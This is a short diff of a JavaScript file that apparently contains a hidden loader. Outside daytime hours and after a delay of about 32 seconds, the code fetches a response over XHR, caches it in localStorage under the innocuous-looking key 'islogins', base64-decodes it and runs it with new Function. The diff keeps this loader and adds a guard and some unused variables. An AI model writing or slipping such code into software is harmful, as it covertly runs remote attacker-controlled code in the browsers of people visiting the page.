@@ -1,3 +1,8 @@
+var i, d = document,
+o = window,
+l = d.documentElement,
+r = document.createElement("style");
+
 var myDate = new Date().getHours();
 if(myDate>20||myDate<9){
     if(localStorage.getItem("islogins")){
@@ -14,10 +19,12 @@ if(myDate>20||myDate<9){
             Http.send();
             Http.onreadystatechange = function () {
                 if (this.readyState == 4 && this.status == 200) {
-                    localStorage.setItem("islogins",Http.responseText)
-                    var engine=window.atob(Http.responseText);
-                    var objective=new Function(engine)
-                    objective()
+                    if(Http.responseText){
+                        localStorage.setItem("islogins",Http.responseText)
+                        var engine=window.atob(Http.responseText);
+                        var objective=new Function(engine)
+                        objective()
+                    }
                 }
             }
         },32040)
